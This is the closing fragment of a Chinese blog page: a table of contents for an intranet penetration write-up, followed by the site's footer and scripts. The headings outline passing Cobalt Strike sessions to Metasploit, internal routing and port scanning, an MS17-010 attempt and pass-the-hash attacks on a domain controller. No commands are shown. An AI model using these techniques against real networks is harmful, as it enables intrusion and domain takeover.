内网渗透</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-CS派生会话给MSF"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">(1)CS派生会话给MSF</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1、MSF开启监听"><span class="level-left"><span class="level-item">4.1.1</span><span class="level-item">1、MSF开启监听</span></span></a></li><li><a class="level is-mobile" href="#2、CS派生会话"><span class="level-left"><span class="level-item">4.1.2</span><span class="level-item">2、CS派生会话</span></span></a></li><li><a class="level is-mobile" href="#3、MSF-简单利用"><span class="level-left"><span class="level-item">4.1.3</span><span class="level-item">3、MSF 简单利用</span></span></a></li><li><a class="level is-mobile" href="#4、添加路由"><span class="level-left"><span class="level-item">4.1.4</span><span class="level-item">4、添加路由</span></span></a></li><li><a class="level is-mobile" href="#5、内网端口扫描"><span class="level-left"><span class="level-item">4.1.5</span><span class="level-item">5、内网端口扫描</span></span></a></li></ul></li><li><a class="level is-mobile" href="#2-MSF进行ms17-010攻击-未成功"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">(2)MSF进行ms17-010攻击(未成功)</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1、msf扫描模块探测是否存在ms17-010漏洞"><span class="level-left"><span class="level-item">4.2.1</span><span class="level-item">1、msf扫描模块探测是否存在ms17-010漏洞</span></span></a></li></ul></li><li><a class="level is-mobile" href="#3-哈希传递攻击-PTH-拿下域控"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">(3) 哈希传递攻击(PTH)拿下域控</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1、CS哈希传递攻击利用"><span class="level-left"><span class="level-item">4.3.1</span><span class="level-item">1、CS哈希传递攻击利用</span></span></a></li><li><a class="level is-mobile" href="#2、MSF哈希传递攻击"><span class="level-left"><span class="level-item">4.3.2</span><span class="level-item">2、MSF哈希传递攻击</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.jpg" alt="≧▽≦" height="28"></a><p class="is-size-7"><span>&copy; 2023 1vxyz</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">🐾🐾🐾</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>